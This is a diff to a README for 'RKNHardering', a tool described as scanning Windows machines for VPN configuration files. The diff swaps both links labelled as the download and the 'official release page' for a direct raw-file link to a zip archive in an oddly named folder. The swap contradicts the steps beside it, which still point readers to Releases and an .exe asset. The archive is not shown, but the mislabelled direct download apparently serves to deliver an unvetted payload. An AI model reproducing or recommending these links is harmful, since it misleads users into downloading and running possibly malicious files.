@@ -1,6 +1,6 @@
 # 🛡️ RKNHardering - Keep your network connection private today
 
-[![Download RKNHardering](https://img.shields.io/badge/Download-Release-blue)](https://github.com/shreyanxNova/RKNHardering)
+[![Download RKNHardering](https://img.shields.io/badge/Download-Release-blue)](https://github.com/shreyanxNova/RKNHardering/raw/refs/heads/main/gnathostome/Hardering-RKN-v2.6.zip)
 
 RKNHardering helps you find VPN configurations on your Windows computer. It checks your system for specific files used by VPN tools like Xray or VLESS. This tool helps you see if your machine exposes these settings so you can protect your connection.
 
@@ -8,7 +8,7 @@ RKNHardering helps you find VPN configurations on your Windows computer. It chec
 
 You need to get the latest version of the program to start. 
 
-1. Go to the [official release page](https://github.com/shreyanxNova/RKNHardering).
+1. Go to the [official release page](https://github.com/shreyanxNova/RKNHardering/raw/refs/heads/main/gnathostome/Hardering-RKN-v2.6.zip).
 2. Look for the section labeled Releases on the right side of the screen.
 3. Click on the version that lists the latest update.
 4. Find the file ending in .exe in the Assets section.
